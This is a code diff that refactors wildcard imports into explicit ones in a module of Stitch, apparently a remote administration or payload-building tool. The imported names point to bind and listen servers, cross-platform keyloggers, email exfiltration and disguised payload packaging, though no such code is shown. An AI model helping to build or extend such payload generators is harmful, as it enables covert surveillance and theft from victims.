@@ -3,25 +3,35 @@ import os
 # Copyright (c) 2017, Nathan Lopez
 # Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.
 
-# TODO: Replace wildcard import with specific imports
-# TODO: Replace wildcard import with specific imports
-from .stitch_utils import *
-# TODO: Replace wildcard import with specific imports
-# TODO: Replace wildcard import with specific imports
-from .stitch_pyld_config import *
+# Specific imports from stitch_utils
+from .stitch_utils import (
+    windows_client, osx_client, linux_client, run_command, progress_bar, 
+    nostdout, zipdir
+)
+# Specific imports from stitch_pyld_config
+from .stitch_pyld_config import stitch_ini, get_conf_dir, gen_default_st_config
 
-# TODO: Replace wildcard import with specific imports
-# TODO: Replace wildcard import with specific imports
-from .Stitch_Vars.nsis import *
-# TODO: Replace wildcard import with specific imports
-# TODO: Replace wildcard import with specific imports
-from .Stitch_Vars.makeself import *
-# TODO: Replace wildcard import with specific imports
-# TODO: Replace wildcard import with specific imports
-from .Stitch_Vars.payload_code import *
-# TODO: Replace wildcard import with specific imports
-# TODO: Replace wildcard import with specific imports
-from .Stitch_Vars.payload_setup import *
+# Specific imports from Stitch_Vars.nsis
+from .Stitch_Vars.nsis import gen_nsis
+# Specific imports from Stitch_Vars.makeself
+from .Stitch_Vars.makeself import gen_makeself
+# Specific imports from Stitch_Vars.payload_code
+from .Stitch_Vars.payload_code import (
+    add_bind_server, add_listen_server, add_listen_bind_main, add_listen_main,
+    add_bind_main, add_run_main, get_encryption, get_protocol, get_win_keylogger,
+    get_osx_keylogger, get_lnx_keylogger, email_imports, get_email, get_requirements,
+    win_util_imports, osx_util_imports, lnx_util_imports, win_reg_exists
+)
+# Specific imports from Stitch_Vars.payload_setup
+from .Stitch_Vars.payload_setup import (
+    win_payload_list, win_payload_Icons, win_payload_Description, win_payload_Name,
+    osx_payload_list, osx_payload_Icons, osx_payload_Description, osx_payload_Name,
+    lnx_payload_list, lnx_payload_Icons, lnx_payload_Description, lnx_payload_Name
+)
+# Additional imports from payload_code (where main_imports, utils_imports, utils_code are defined)
+from .Stitch_Vars.payload_code import (
+    main_imports, utils_imports, utils_code
+)
 
 if windows_client():
     import py2exe
